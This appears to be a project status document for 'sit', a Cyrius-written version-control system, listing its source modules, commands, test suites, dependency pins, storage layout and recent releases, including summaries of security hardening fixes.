| `src/serve.cyr` | 1491 | `cmd_serve` + `serve_handle_request` dispatcher. **v0.8.8 HTTPS server**: `sit serve --tls --cert --key` + `_serve_run_tls` (hand-rolled TLS accept loop: `tls_native_new_server` → `server_load_creds` → `tls_native_accept` → **v0.8.9 keep-alive inner loop** (serve requests until the client closes / 30s `SO_RCVTIMEO`) → close; TLS responses advertise `Connection: keep-alive`) + `_serve_load_cert` (PEM via sigil `pem_decode_certs` / DER). All 67 response sites route through `_serve_send_status` / `_serve_send_response` wrappers, TLS-or-plain via the per-connection `_serve_tls_ctx` global (single-threaded loop → connection-safe; plain http byte-identical). v0.7.2: `GET /sit/v1/capabilities` + `GET /sit/v1/refs`. v0.7.3: `GET /sit/v1/objects/<hash>` (with `X-Sit-Type: <int>` response header). v0.7.4: `POST /sit/v1/want`. v0.7.6: `POST /sit/v1/objects/<hex>` (rehash via sigil + `_serve_rehash_and_insert`) and `POST /sit/v1/refs/<refname>` (FF gate via `is_ancestor_in_db`); bearer auth via `--require-auth` + `_serve_load_token` (strict 0600 + control-byte rejection) + `_serve_auth_ok` (constant-time compare). Capabilities emit `"auth":["bearer"]` or `"auth":["none"]` per the runtime mode |
| `src/refs.cyr` | 743 | HEAD/branch/tag/resolve + `cmd_branch/checkout/tag` (ref-name + hex validation in 0.6.0) |
| `src/object_db.cyr` | 1275 | patra object store with `_object_db_cached` handle (v0.6.4); `resolve_hash`, `read_object`, framing + compression with v0.6.9 4× initial multiplier; `cat-file` / `owl-file` / `fsck`. **v0.8.14: `fsck --prune`** — `db_object_delete` (hex-validated `DELETE FROM objects`) removes the dangling set the walk finds, `patra_flush` for durability, refused under `.sit/MERGE_HEAD` (v0.9.0 also refuses when `bad>0` or every object is unreachable — a corrupt interior object would otherwise orphan + delete its reachable subgraph). **v0.8.5: fsck reachability** — `fsck_walk_reachable` (BFS over the object graph, classifies by framing prefix, follows every `parent` line), `fsck_collect_roots` (heads + tags + remotes via `dir_walk` + detached HEAD), `fsck_collect_commit_parents` (multi-parent, distinct from `parse_commit_body`'s single-parent capture), `fsck_extract_commit_tree`, `fsck_read_ref_tip`, `fsck_walk_refs_dir`. Integrity SELECT widened to `(hash, ty)` for git-shaped `dangling <type> <hex>` output without a second read per dangling object |
| `src/reflog.cyr` | 456 | **v1.1.0 reflog** (`[lib].modules`, before `object_db.cyr`): `.sit/logs/` git-format journal — append + read, identity/label/output sanitization, `@{N}` indexing. `reflog_head_move` lives in `refs.cyr` (reads `read_head_ref_path`). [ADR 0010](../adr/0010-reflog-and-recovery.md) |
| `src/git_read.cyr` | 392 | **v1.2.0 `.git/` read backend**: `_detect_repo_backend`, `_id_hexlen`/`_id_rawlen` width helpers, `_git_detect_hash_algo`, `_git_read_loose` (loose object + zlib), the git ref readers (`_git_read_head_ref` symref→loose→`packed-refs`, `_git_resolve_ref_name`, `_git_packed_ref_lookup`), and `_ignore_filename` (`.gitignore`). [ADR 0011](../adr/0011-git-read-mode.md) |
| `src/git_pack.cyr` | 519 | **v1.2.0 git packfile decode**: `.idx` v2 binary-search (`_git_idx_lookup`, `_be32`/`_be64`/`_memcmp_n`), one-entry pack cache, pack v2 header parse, and the self-written OFS_DELTA/REF_DELTA copy-insert **delta interpreter** (`_git_apply_delta`) with recursive base chains (`_git_pack_obj`, depth-capped 64). Entry: `_git_read_pack` / `_git_read_any`. **⚠ Every byte this file reads is attacker-controlled** — `.git/` mode exists to report on repos cloned from untrusted remotes. **v1.3.7 (S-24)** added the bounds checking it shipped without: `.idx` table geometry validated against real file length (was three reproducible SIGSEGVs), delta literal + COPY operand runs bounded against `delta_len` (was a 127-byte heap disclosure returned as *success*), the three varint decoders take a length and cap their continuation run, pack `offset` bounded to `[12, plen)`, no negative-length inflate, zero-distance OFS_DELTA rejected, REF_DELTA oid bounded. Fuzzed since 1.3.7 (`fuzz_pack_varints`, `fuzz_apply_delta`) + an 11-case hostile corpus |
| `src/index.cyr` | 839 | staging index + `.sitignore` + `cmd_add/rm/reset`; `_index_db_cached` (v0.6.4); `parse_index` `ORDER BY path` (P-20, v0.6.11). **v0.8.10 git-parity `.sitignore`**: `_wildmatch` (WM_PATHNAME glob: `*`/`?`/`[...]`/`**`/dir-exclusion), `is_ignored` (anchored vs any-level + last-match-wins `!` negation over a `[text,len,negated,anchored]` struct vec), `load_sitignore` (parses `!`, leading/middle `/` anchoring, `\!`/`\#` escapes) |
| `src/commit.cyr` | 1095 | builders, parsers, `cmd_commit/log` (author sanitization + integer-overflow guards in v0.6.0/0.6.2). **v0.8.7**: `parse_commit_body` collects every parent into a vec at `out+48` (last parent still at `out+8` for back-compat); `is_ancestor` rewritten as a full-DAG BFS. **v0.8.12**: `sit log --graph` — `print_graph` + `_graph_*` helpers render an ASCII commit DAG (full-DAG BFS, position-grid lanes `* | / \`, reverse-topological newest-first emission; v0.9.0 guards the column-0 join/merge seam against a `buf-1` underflow); `cmd_log` reads `.sit/shallow` and stops cleanly at the boundary. **v0.9.0**: `commit_parents_of` consolidates the read+parse+parents boilerplate shared by `is_ancestor` / `find_merge_base` |
| `src/merge.cyr` | 892 | 3-way merge, conflict markers, `cmd_merge` (FS-mutation return checks in v0.6.2). **v0.8.13**: `find_merge_base` rewritten as a full-DAG LCA (ancestor-set + prune-BFS frontier + redundancy reduction via `is_ancestor`; was a single-`out+8`-chain walk); `_merge_commit_ts` tiebreak; new `cmd_merge_base` plumbing (`sit merge-base <a> <b>`) |
| `src/diff.cyr` | 1351 | LCS (DP table via fl_alloc since v0.6.9; **v1.0.1 zeroes the DP base row/col** — fl_alloc only zeros fresh mmap pages, so a recycled freelist table gave non-minimal diffs), hunks, working walker + `cmd_diff/show/status`. **v1.0.1: `myers_diff` (P-14)** — bounded greedy Myers fallback when the DP cap (>8192/dim) is hit; same op-tuple format. v0.8.1: `compute_file_diff` (pure-compute layer; no I/O) extracted from `print_file_diff`; `cmd_diff` / `cmd_show` parse `-U<N>`; `print_file_diff` signature gained trailing `ctx` arg (13 callers updated); `ann_*` accessors marked stable per ADR 0009 |
| `src/wire_http.cyr` | 1369 | Sit-side HTTP/1.0 client (TLS-capable since v0.8.8; **https keep-alive since v0.8.9** — `_wire_https_acquire` / `_wire_https_teardown` hold one persistent socket+ctx on the handle (80 bytes), `_wire_https_exchange` reads responses by exact Content-Length so the connection is reused across all requests; `_wire_http_request` / both POST variants delegate to it when `is_tls`). v0.7.3: `wire_http_open`, `_wire_http_request`, `http_remote_read_refs`, `http_remote_read_raw`, `http_remote_read_both`. v0.7.4: `_wire_http_post`, `http_remote_check_batch` (also detects `"auth":["bearer"]` since v0.7.6), `http_remote_read_batch`. v0.7.5: `_wire_http_decode_frames` extracted as fuzz target. v0.7.6: `_wire_http_post_xhdr` (variant injecting `X-Sit-Type` + Authorization), `http_remote_push_object`, `http_remote_push_ref`, `_wire_http_load_client_token`. Handle layout 48 bytes (adds `server_requires_auth` + `auth_token` to the v0.7.4 `batch_probed` + `batch_supported`); both `_wire_http_post` variants inject `Authorization: Bearer <token>` when handle has a token loaded. **v0.8.8**: handle grows to 64 bytes (`is_tls` + hostname); `wire_http_open` accepts `https://` (port 443); `_wire_http_request` + both POST variants do a per-request `_wire_https_connect` handshake and route I/O through `_wire_io_send` / `_wire_io_recv` |
| `src/wire.cyr` | 1709 | remote config; **v0.8.12 shallow clone**: `walk_reachable_phased` phase-1 walk gains a depth cap via module globals `_wire_clone_depth` / `_wire_shallow_boundary` (four call sites unchanged); `cmd_clone` parses `--depth <n>`, arms the cap around `do_fetch`, and writes `.sit/shallow` via `_write_shallow_file`. v0.7.3 `obj_src` abstraction (`OBJ_SRC_DB` / `OBJ_SRC_HTTP` tagged dispatch); v0.8.2 adds `OBJ_SRC_SSH = 2` + `obj_src_for_ssh` + SSH branch in `obj_src_read_raw` / `_read_both`; `cmd_remote/fetch/pull/push/clone` with `--force-absolute` gate (S-23) + walk-cache (P-04, v0.6.7) + batched transactions (P-03, v0.6.5); `wire_transport_check_readable` accepts ssh:// since v0.8.2 and **https:// since v0.8.8** (TLS via `wire_https.cyr`); `_writable` still rejects https:// (push over TLS is a 0.8.9 followup). v0.7.5: `walk_reachable_phased` + `walk_reachable_tree_batched` (cache-aware). v0.7.6: `cmd_push` branches on URL scheme; `_do_push_http` runs the HTTP push pipeline. v0.8.2: `do_fetch` gains a third arm dispatching to `wire_ssh_open` / `ssh_remote_resolve_branch` / `obj_src_for_ssh`. **v0.8.7**: `walk_reachable_phased` + `is_ancestor_in_db` enqueue **all** parents (`out+48` vec) so merge subgraphs aren't dropped on clone/fetch/push or misjudged by the FF gate |
| `src/wire_ssh.cyr` | 650 | **v0.8.2 SSH transport** ([ADR 0008](../adr/0008-ssh-transport.md)). `_ssh_parse_url` (CVE-2017-1000117 leading-dash rejection on user / host / path), `_ssh_find_binary` (PATH walk for absolute ssh exec), `_ssh_push_env` (curated envp: HOME / USER / LOGNAME / SSH_AUTH_SOCK / TERM / PATH), `wire_ssh_open` (pipe×2 + fork + raw `sys_execve` of `ssh -T [-p N] -- user@host sit serve <path> --stdio` + capabilities probe), `wire_ssh_close` (close fds + waitpid), `_wire_ssh_request` (build + send HTTP/1.1 GET, recv via shared helper), `_wire_ssh_recv_response` (response-parse extracted v0.8.3 so GET + POST share it), `_wire_ssh_parse_content_length`, `ssh_remote_read_refs` + `_wire_ssh_parse_refs`, `ssh_remote_resolve_branch`, `ssh_remote_read_raw`, `ssh_remote_read_both`. **v0.8.3 push**: `_wire_ssh_post_xhdr` (POST with extra header for `X-Sit-Type`), `ssh_remote_push_object`, `ssh_remote_push_ref`, `_ssh_handle_auth_token` stub (returns 0; bearer-over-SSH is v0.8.3.x slot) |
| `src/wire_https.cyr` | 247 | **v0.8.8 HTTPS transport** (TLS 1.3 via cyrius `lib/tls_native.cyr`; no libssl, ADR 0007). v0.8.9: `_wire_https_connect` sets a 30s `SO_RCVTIMEO` (stalled-peer bound). TOFU pin store: `known_certs_path`, `_tofu_find_pin` (pure host:port→SPKI-hash scan, unit-tested), `_tofu_record_pin` (0600 read-modify-write, symlink-guarded), `tofu_check_pin` (first-use records, match trusts, mismatch refuses). TLS transport: `_wire_https_connect` (handshake → `set_verify(NONE)` → `tls_native_get_peer_spki_der` pin), `_wire_io_send` / `_wire_io_recv` (TLS-or-plain, 16 KB record fragmentation + post-handshake-record skip), `_url_is_http_family`. Trust = TOFU/pinned SPKI in `~/.sit/known_certs` (ADR 0008 host-key parity); CA + hostname verify is a post-v1 opt-in |

## Commands shipped

**27 total.** `init`, `add`, `rm`, `branch`, `checkout`, `tag`, `merge` (`-S`), **`merge-base` (v0.8.13)**, `reset`, `commit` (`-S`), `config`, `fsck` (**`--prune` since v0.8.14**), `key`, `verify-commit`, `reflog` (**v1.1.0**), `remote`, `fetch` (file:// + http:// + https:// + ssh://), `pull`, `push` (file:// + http:// + https:// + ssh://), `clone` (file:// + http:// + https:// + ssh://; **`--depth <n>` shallow since v0.8.12**), `log` (`--oneline`, **`--graph` since v0.8.12**), `status`, `diff`, `show` (`--stat`), `cat-file`, `owl-file`, `serve` (loopback HTTP daemon + `--stdio` (ssh) + `--tls` (https) since v0.8.8; read-only `/sit/v1/{capabilities,refs,objects/<hash>}` + write `/want`/`objects`/`refs`). **https:// is a full read+write transport since v0.8.9** (clone/fetch/push), keep-alive (one handshake per operation). **v1.2.0**: `cat-file` / `owl-file` read `.git/` objects (loose + packed) on an existing git repo.

## Tests

- **Unit**: `tests/sit.tcyr` — **282 assertions** (v1.3.5 adds `test_sankoch_zlib_large_object` — 9 assertions across 512 KiB / 1 MiB / 2.5 MiB zlib roundtrips, pinning sankoch's 1 MiB `DEFLATE_BLOCK_SIZE` chunker boundary after the >1 MiB corruption bug; the pre-existing roundtrip group uses an 88-byte string and never reached the chunker, which is why that bug survived to 1.3.4; v1.1.0 adds the reflog groups: format + `@{N}` indexing/off-by-one, identity-sanitization regression, `@{N}` selector parse, and fsck commit author-ts extraction; v1.0.1 adds the `myers_diff`-vs-DP differential group: minimality + reconstruction over 10 cases; up from 31 in 0.5.x; v0.8.10 adds the `_wildmatch` glob-core + `is_ignored` negation/anchoring groups; v0.8.8 added the TOFU pin-lookup group). Covers sigil SHA-256 known-answers, git-SHA-256 blob framing, hex encode/decode, sankoch zlib roundtrip, patra COL_BYTES small + 16KB overflow, ed25519 sign/verify roundtrip with bit-flip negatives, the v0.6.0 validator suite (refname / tree-entry-name / tree-flat-path / hex-prefix / config-value / remote-URL positive + negative cases), and the **v0.8.7 `parse_commit_body` multi-parent group** (merge body → both parents in order, single-parent → one, root → none, plus the `out+8` back-compat invariant). The file now `include`s `src/lib.cyr` (the `tests/sit.fcyr` pattern) so internal functions like `parse_commit_body` are reachable; DCE strips everything not exercised.
- **Integration**: `tests/integration/run.sh` (**88 assertions** as of v1.4.0; 58 → 70 at 1.3.7, → 78 at 1.3.8, → 83 at 1.3.9, → 88 at 1.4.0) — **v1.3.7 adds scenario 10, the hostile packfile corpus** (`hostile_pack.py` + `packlib.py`, `python3`-guarded): 11 crafted `.idx` / `.pack` fixtures covering the S-24 finding classes — unbounded fanout / object count / large-offset table, pack offset past EOF, truncated idx, varint run-off, delta literal + COPY operand overrun, zero-distance OFS_DELTA, REF_DELTA oid past EOF — each asserted to refuse cleanly rather than crash **or silently leak**. It opens with a **positive control** (valid pack + real OFS_DELTA, byte-for-byte roundtrip): load-bearing, because the corpus's first draft scored **7 false passes** from fixtures that bounced off an earlier error path without reaching the parser, which is indistinguishable from a real pass. Proven non-vacuous by A/B against a pre-fix binary — 4 cases fail there (3× `exit=-11` SIGSEGV, 1× `LEAK 127B`). Promoted from `docs/guides/getting-started.md`: core loop, **no-upward-discovery (ADR 0003, v1.0.1)**, branch+merge, `log --graph` snapshot + lane-0-join regression, `merge-base` diamond LCA, `fsck --prune`, full clone round-trip, `--depth 1`/`--depth 3` shallow, push dispatch, **9000-line diff via Myers fallback (v1.0.1)**, and the **v1.2.0 `.git/` read-mode block** (`git`-guarded): loose blob + HEAD-symref commit read matching `git cat-file`, `packed-refs` resolution, packed objects via `.idx` + inflate, SHA-256 repos (loose + packed), and a `dist/sit.cyr`-linked library-API probe (`git_probe.cyr`) asserting `sit_repo_branch` / `sit_repo_status` vs the working tree. Runnable locally + as the CI integration step. Plus `docs/examples/local-vcs-loop/walkthrough.sh` and the other CI smoke steps (signed commit + verify, clone → push → re-clone, http/https/ssh transports; CI clone uses `--force-absolute` per S-23).
- **Benchmarks / fuzz**: two tracks. **Micro** — `tests/sit.bcyr`, per-primitive lower bounds, snapshot per release under `docs/benchmarks/` (latest [`2026-08-18-v1.4.0.md`](../benchmarks/2026-08-18-v1.4.0.md)). **Head-to-head vs git** — `scripts/benchmark.sh`, refreshed at v1.4.0 after being a v0.6.12 snapshot since April: sit is faster than its own v0.6.12 on **9 of 10 ops** despite the audit arc's guards, beats git on `fetch`/`commit`/`init`, ties `add-1KB`, and loses the six read/compress-heavy rows; `clone` at 12.13× is the worst and is gated on wiring `patra_insert_row_or_ignore`. Full write-up in [`benchmarks-git-v-sit.md`](benchmarks-git-v-sit.md). `tests/sit.bcyr` was **refreshed in v0.8.12** (fixed the stale `copy_objects` call; added LCS-diff / `is_ignored` / blob-hash groups alongside the sigil + sankoch primitives), so `cyrius bench` is a per-release gate again; latest baseline `docs/benchmarks/2026-08-18-v1.4.0.md`. `tests/sit.fcyr` — **9 harnesses as of v1.3.7** (was 7): random inputs through hash / zlib / hex_decode / url / ssh-url / want-frame / reflog-index, plus **v1.3.7's `fuzz_pack_varints` (500k rounds) and `fuzz_apply_delta` (200k rounds)**. Those two close the gap the 2026-08-17 audit found: the git packfile decoders had **no fuzz target through v1.3.6**, and that is exactly where both HIGH memory-safety defects were. ⚠ Without ASAN, fuzzing catches *crashes*, not a 127-byte overread into mapped heap — the heap disclosure is pinned by the deterministic integration corpus above, not by these. Per-release `docs/benchmarks/*.md` snapshots capture the numbers.

## Dependencies (current versions)

**No git deps as of v1.3.6.** All four first-party layers are folded into the cyrius stdlib snapshot and declared as `[deps].stdlib` leaves, so **the `cyrius` pin in `[package]` selects all four versions** and `cyrius.lock` carries zero commit-pinned entries. Versions below are what **6.5.24** folds. No FFI, no C, no libgit2 — see [ADR 0001](../adr/0001-no-ffi-first-party-only.md).

> ⚠ **Do not re-add these as `[deps.<name>]` git blocks.** A git pin on a folded module (a) **overrides** the fold for everything downstream — `cyrius deps` overlays it on top of the snapshot on every build, recursing through sibling manifests, and `deps --verify` can't catch it because the lock is written *from disk* and records the downgraded file's hash; and (b) makes `cyrius distlib` **reclassify the module out of the stdlib leaves**, dropping it from `dist/sit.deps` — at 1.3.5's shape the sidecar omitted sigil / sankoch / patra while `dist/sit.cyr` referenced 27 of their symbols. patra (1.13.0) and sigil (3.12.7) made this same change upstream; kavach hit the reclassification. Rationale is recorded inline in `cyrius.cyml`. To move a dep version, move the toolchain pin.

- **sakshi** 2.4.10 — tracing, error handling. Prior git pin 2.4.7 (v1.3.5); folded by cyrius 6.5.16. Range is a patch refresh (`sakshi_log_kv` no longer flattens fields before the emit hook or truncates at 256 bytes in silence; `_sk_fmt_int` bare-`-` fix for `i64::MIN`). No impact for sit — **sit calls no sakshi symbol directly**; it arrives transitively via patra (2 sites) and the vendored sandhi (3 sites)
- **sankoch** 2.7.7 — LZ4/DEFLATE/zlib/gzip. Prior git pin 2.7.6 (v1.3.5); folded by cyrius 6.5.17. **Verified against the bundle diff, not the changelog** (the >1 MiB corruption that shipped through 1.3.4 is why): 2.7.6 → 2.7.7 is **purely additive in the ZIP layer** — 11 new functions, all `zip_*` / `_zip_*` plus `_sankoch_alloc_via` (a sizing API `zip_bound`, allocator-scoped `zip_open_a` / `zip_writer_init_a`, and discriminated `zip_last_error`) — with **zero change to deflate / inflate / zlib / LZ77 / Huffman**, which is sit's entire consumed data path. Nothing owed
- **sigil** 3.12.9 — SHA-256 + ed25519 signing. Prior git pin 3.12.2 (v1.3.5); folded by cyrius 6.5.22. **Consumed surface is 10 symbols**: `hash_data`, `hex_encode`, `hex_decode`, `hex_decode_into`, `hex_is_valid`, `ed25519_keypair`, `ed25519_sign`, `ed25519_verify`, `ed25519_generate_keypair`, `pem_decode_certs` (serve.cyr's `--tls` PEM chain loader) — all still defined and unchanged across the range. Two range events look alarming and are both **off sit's path**: 3.12.8's **breaking** rename of the 14 bare `err_*` constructors to `sigil_err_*` (sit's source references no `err_*` symbol), and the 3.12.3–3.12.6 **forged-signature bypass in banked RSA PKCS#1 v1.5 and PSS verify** (sit signs and verifies with **ed25519 only** and never calls the RSA surface). 3.12.9 also localised the banked RSA / bignum workspaces, removing 9.53 MiB of `.bss` — this is the whole of sit's 14.84 MB → 2.84 MB binary drop. No general SHA-1 (its `sha1` refs are TPM-only) — `.git/` read never *computes* SHA-1
- **patra** 1.13.0 — B+ tree / WAL object store. Prior git pin 1.12.12 (v1.3.5); folded by cyrius 6.5.20. A **minor** bump in the storage layer, so verified against the bundle diff: 1.12.12 → 1.13.0 is **three hunks and zero logic change** — the version stamp, `#ifdef` / `#else` / `#endif` directives indented to their block in `_wal_gen_salts`, and one continuation-line indent in a `row_read_int` call. No storage-format change is possible from that diff, so **no repo migration and no A/B data repro is owed**. (The indented-directive hunk is the one that could bite — `_wal_gen_salts` uses `#ifdef` to select between `sys_getrandom`, a raw syscall and the agnos `SYS_TIME_UNIX` fallback — but cyrius's preprocessor is not column-sensitive, and sit builds and passes on Linux and `--agnos` alike.) The release's actual substance was removing patra's own `[deps.sakshi]` block, which is what surfaced the same defect in sit's manifest. Still ready to wire: `patra_insert_row_or_ignore` (1.12.6, P-11)

<details><summary>Prior pin notes (v1.3.5 and earlier, retained for blast-radius reference)</summary>

- **sankoch 2.7.6** — bumped from 2.4.9 in v1.3.5, a **three-minor jump**. **This bump fixed silent >1 MiB object corruption** — sankoch ≤ 2.7.5's batch DEFLATE chunker resumed each 1 MiB block at `block_end` while the encoder had overshot by up to `LZ77_MAX_MATCH` (258) bytes, so the overshoot was encoded twice and the stream would not decode. sit compresses every object through `zlib_compress` (`src/object_db.cyr:176`), so **every sit ≤ 1.3.4 corrupted compressible objects over ~1 MiB on write**; repos written by those versions still hold bad objects (`sit fsck` → `unreadable <hex>`; `sit add` reported success at write time). **Data-dependent, not size-deterministic** — it needs an LZ77 match beginning just below a block boundary and extending past it, so incompressible >1 MiB content (archives, media, encrypted blobs) was always fine while compressible content of the same size was not; run `fsck` rather than inferring from file sizes. The same `sp = block_end` chunker is present in every sankoch sit has vendored back to the v0.8.x line, so the blast radius is roughly **v0.8.0 – v1.3.4**. Regression-tested since 1.3.5 by `test_sankoch_zlib_large_object` (512 KiB / 1 MiB / 2.5 MiB roundtrip), confirmed to fail at 2.4.9 and pass at 2.7.6. One behavioural change newly reached sit at that bump: 2.5.10 extended the 16 MiB `DECOMPRESS_MAX_OUTPUT` ceiling to stored DEFLATE blocks, so a git packfile object >16 MiB built from stored blocks now fails closed with `-ERR_OUTPUT_LIMIT` at `src/git_pack.cyr:267/290/310` — clean read failure, no corruption. Still ready to wire: `zlib_decompress_with_ratio_cap` (2.4.5, decompression-bomb defense)
- **sigil 3.12.2** — bumped from 3.10.0 in v1.3.5; consumed surface verified unchanged in arity against all 45 call sites. That range's security fixes (authenticode byte-range, PE-parser hardening, a 144-byte leak) were entirely off sit's path. **3.12.1 required cyrius ≥ 6.4.65** (`thread_local_alloc`) and moved sigil's crypto-bank off the hardcoded thread-local slot 8, permanently closing a collision class with patra (slots 0–4) that sit was uniquely exposed to by linking both
- **patra 1.12.12** — bumped from 1.12.9 in v1.3.5. Range was additive: the only new export was `patra_quote_str` (1.12.10). 1.12.10 also fixed a **silently-dropped-row** bug in the SQL tokenizer (`''` escaping) — **unreachable for sit**: all six interpolated-SQL sites (`object_db.cyr:54/98/185/808`, `wire.cyr:99/115`) interpolate 64-char validated hash hex, and untrusted index paths go through the typed `patra_insert_row` API, never a SQL string. 1.12.12 migrated its five thread-local slots off hardcoded indices onto `thread_local_alloc`
- **sakshi 2.4.7** — bumped from 2.4.4 in v1.3.5 (patch refresh: AGNOS `O_RDWR` read fix, toolchain catch-up pin, two private-internal renames `_sk_write_int`/`_sk_write_str` → `_sk_buf_write_number`/`_sk_buf_write_string`). No public-surface impact for sit — **sit calls no sakshi symbol directly**; it arrives transitively via patra (2 sites) and the vendored sandhi (3 sites)

</details>

**Cyrius stdlib declared explicitly** in `cyrius.cyml [deps].stdlib`. Transitive `[deps]` include doesn't reach enum / constant references at sandhi's TLS shim or sigil's crypto primitives, so transitives stay explicit. Current list (**38 leaves**): `slice`, `string`, `fmt`, `alloc`, `io`, `vec`, `str`, `syscalls`, `assert`, `fs`, `args`, `chrono`, `hashmap`, `process`, `tagged`, `fnptr`, `thread`, `thread_local`, `sync`, `freelist`, `bayan`, `ct`, `keccak`, `random`, `bench`, `net`, `mmap`, `dynlib`, `fdlopen`, `tls`, `tls_native`, `ws`, `http`, `sandhi`, **`sakshi`**, **`sankoch`**, **`sigil`**, **`patra`**. **v1.3.6** added the last four — they were `[deps.<name>]` git blocks through 1.3.5; see the warning above for why that shape was wrong and must not return. This list is now exactly what `dist/sit.deps` emits, so a consumer building from `dist/sit.cyr` + the sidecar resolves every symbol the bundle references (it could not before — the sidecar omitted the three modules defining 27 of them). **v1.3.5** added `thread_local` — sigil (≥ 3.12.1, crypto-bank slot) and patra (1.12.12, five migrated TLS slots) both call `thread_local_alloc` / `_get` / `_set` on hot paths. cyrius 6.5.4 resolves it transitively, so this is declaration hygiene rather than a live fix — but an undeclared module of this class fails at *runtime*, not build time, which is exactly how the missing `random` module made `sit key generate` SIGILL at v1.0.2. **v1.2.0** added `sync` (patra 1.12.7's cross-handle tail-page cache guard). `sync` and `thread` both used to export `mutex_*` on Linux, producing three benign `duplicate fn 'mutex_*' (last definition wins)` build warnings; **as of cyrius 6.5.4 `lib/thread.cyr` no longer defines them** — `sync` is the sole owner and the warnings are gone. `thread` still can't be dropped: sigil needs `thread_join` and sandhi needs `chan_new` / `chan_send`. **v1.0.2** added `random` (sigil 3.9.1 routes `ed25519_generate_keypair` entropy through stdlib `random_bytes` in `lib/random.cyr`; absent it, `sit key generate` SIGILLs — exit 132 — on the unresolved call). **v0.8.8** added `tls_native` (cyrius 6.x's sovereign pure-Cyrius TLS 1.3 — the HTTPS transport; fits the build with no 256-global overflow). **v0.8.6 cyrius 6.x reorg**: `bigint` / `base64` / `json` were dropped — cyrius 6.x folded all three into the **`bayan`** omnibus bundle (functions gained a `bayan_` prefix; back-compat aliases keep sigil's `u256_*` working). `slice` was added — cyrius 6.x's `agnosys` stdlib now needs it. `async` is deliberately **omitted**: sandhi 1.4.10's `sandhi_server_run_async` references it, but sit's `cmd_serve` uses the synchronous `sandhi_server_run`, so adding `async` (which overflows the 256-global cap and hard-fails the build) buys nothing — the four `undefined function 'async_*'` build warnings are benign dead-code refs DCE strips.

Cyrius 5.7.0 (the sandhi fold) vendored `sandhi` v1.0.0 into stdlib as `lib/sandhi.cyr` and deleted `lib/http_server.cyr`; subsequent cyrius releases re-vendor newer sandhi. At cyrius 5.11.34 the vendored `lib/sandhi.cyr` is 11,729 lines (sandhi v1.3.4 — TLS 1.3 0-RTT, HTTP/2, RPC dialects, retry, SSE, session-cache cred-strip, return-type annotations). Sit consumes ~6 `sandhi_server_*` primitives from that surface. The `PP_IFDEF_PASS` 2 MB → 8 MB cap raise (cyrius v5.11.33, filed by sit at v0.8.0 prep) is what made consuming this sandhi viable; the "drop sandhi, hand-roll loopback HTTP/1.0 server on `lib/net.cyr`" alternative is queued as a post-1.0 slot for surface-minimization reasons but is no longer load-bearing for the build. The token-array cap that previously blocked sandhi opt-in (issue archived 2026-04-25) was raised 262144 → 1048576 in cyrius 5.8.46.

## Storage layout (sit repos on disk)

- **`.sit/HEAD`** — symbolic ref (`ref: refs/heads/main\n`)
- **`.sit/refs/heads/<name>`** — branch ref, 64-char hex + `\n`
- **`.sit/refs/tags/<name>`** — tag ref, same format
- **`.sit/refs/remotes/<remote>/<branch>`** — remote-tracking ref
- **`.sit/objects.patra`** — patra DB, schema `objects(hash STR, ty INT, content BYTES)`
- **`.sit/index.patra`** — staging index, schema `entries(path STR, hash_hex STR)`
- **`.sit/config`** — local config (`user.name`, `user.email`, `remote.<name>.url`)
- **`~/.sitconfig`** — global config (same format)
- **`~/.sit/signing_key`** (0600) / `~/.sit/signing_key.pub` (0644) — ed25519 seed + pubkey hex
- **`.sit/logs/HEAD`**, **`.sit/logs/refs/heads/<branch>`**, **`.sit/logs/refs/remotes/<remote>/<branch>`** — reflog (v1.1.0): append-only git-format journal, one line per ref movement (`<old64> <new64> <name> <email> <ts> +0000\t<msg>`); see [ADR 0010](../adr/0010-reflog-and-recovery.md). Tags are not logged
- **`.sit/MERGE_HEAD`** — in-progress merge marker (cleared on commit or `--abort`)
- **`.sit/shallow`** — shallow-clone boundary markers (v0.8.12): one 64-char hex per line, each a present commit whose parents were not fetched. Written by `sit clone --depth <n>`; read by `sit log` to stop cleanly at the boundary. Absent for full clones
- **Legacy**: `.sit/objects/<xx>/<yy...>` loose files and plaintext `.sit/index` auto-migrate on first access — see [arch 002](../architecture/002-loose-objects-until-patra-bytes.md)

## Recent shipped releases

| Version | Date | Summary |
|---------|------|---------|
| 1.4.1 | 2026-08-18 | **Every object lookup was a full table scan.** Wiring the two available dep capabilities exposed a missing index: `objects.hash` had none, so patra scanned the table on every `read_object` / `db_object_has` / `resolve_hash` and `log`/`status`/`diff`/`clone` were quadratic in repo size (50 reads: 14 ms @300 objects, 44 ms @1200). Indexed on both local and remote stores, migrated once via `.sit/objects.indexed`. **`clone` −27% (12.13× → 8.64× git)**, `log` −13%, single read −37%. Curve improved but not flat — residual is patra-side, tracked as 1.4.2. Index is also the precondition for `patra_insert_row_or_ignore` (wired; without it or-ignore silently always-inserts). All 15 inflate sites now ratio-capped at 1000:1. |
| 1.4.0 | 2026-08-18 | **`fsck` reports missing objects; commit identities can't forge headers.** Same bug from both ends. `fsck` enumerated only objects IN the store, so an ABSENT referent (a commit whose parent/tree names an oid the store lacks) was never seen — the canonical broken repo reported `0 bad, 0 dangling`, exit 0. Now reported as `missing <oid>`, counted toward `bad`, `--prune` refuses. Shallow-clone boundaries exempted via `.sit/shallow` (the existing `--depth 1` test caught the first cut). And a newline in `SIT_AUTHOR_NAME` forged `parent` lines in the commit object — which is precisely the corruption fsck couldn't see; identities are now stripped of control bytes and `<`/`>` before framing. **Minor**: fsck now exits non-zero on repos it previously called clean. Themed minor line shifts +1. 88 integration (was 83). |
| 1.3.9 | 2026-08-18 | **The deferred findings, closed — audit backlog now empty.** All ten MEDIUM/LOW that 1.3.8 deliberately deferred, plus three sub-items. Headline is functional: **sit refused to diff any >8192-line file added or deleted** (per-dimension guard fired before the cell count; a pure addition is a 1x(n+1) table but was pushed to Myers, which refused — header printed, zero content lines). Also `-U0` now truly zero-context (matches GNU diff); `-U<N>` clamped (2^62 overflowed `2*ctx` into a ~4.6e18-iteration spin); **`fsck --prune-now` could delete objects a live tree still references** (silently-dropped tree entries invisible to the walk; remotely pushable) — now refused; unvalidated ids on the remote-handle SQL path; remote-driven unbounded client allocation, capped with failure propagated; `sit_repo_open` probed the wrong directory before the repo root was set (AGNOS-relevant); config echo sanitized; dropped auto-merge write now reported. 83 integration (was 78). |
